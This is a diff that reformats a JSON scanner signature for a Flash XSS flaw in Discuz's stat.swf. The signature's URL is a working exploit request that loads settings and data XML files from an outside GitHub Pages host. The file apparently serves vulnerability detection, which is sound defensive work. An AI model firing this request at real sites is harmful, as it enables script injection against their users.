@@ -1,1 +1,15 @@
-{"program":"discuz", "detector":"Accurate", "method":"get", "cookies":false, "headers":false, "md5":"34bab7d08192bbea604ff6b9e8523dd9", "type":"Flass XSS", "severity":"Medium", "url":"static/image/common/stat.swf?path=&settings_file=http://unikone.github.io/dz.stat.config.xml&data_file=http://unikone.github.io/dz.stat.data.xml", "payload":"", "description":"", "suggestion":"update", "file":"static/image/common/stat.swf"}
+{
+    "program": "discuz",
+    "detector": "Accurate",
+    "method": "get",
+    "cookies": false,
+    "headers": false,
+    "md5": "34bab7d08192bbea604ff6b9e8523dd9",
+    "type": "Flass XSS",
+    "severity": "Medium",
+    "url": "static/image/common/stat.swf?path=&settings_file=http://unikone.github.io/dz.stat.config.xml&data_file=http://unikone.github.io/dz.stat.data.xml",
+    "payload": "",
+    "description": "",
+    "suggestion": "update",
+    "file": "static/image/common/stat.swf"
+}
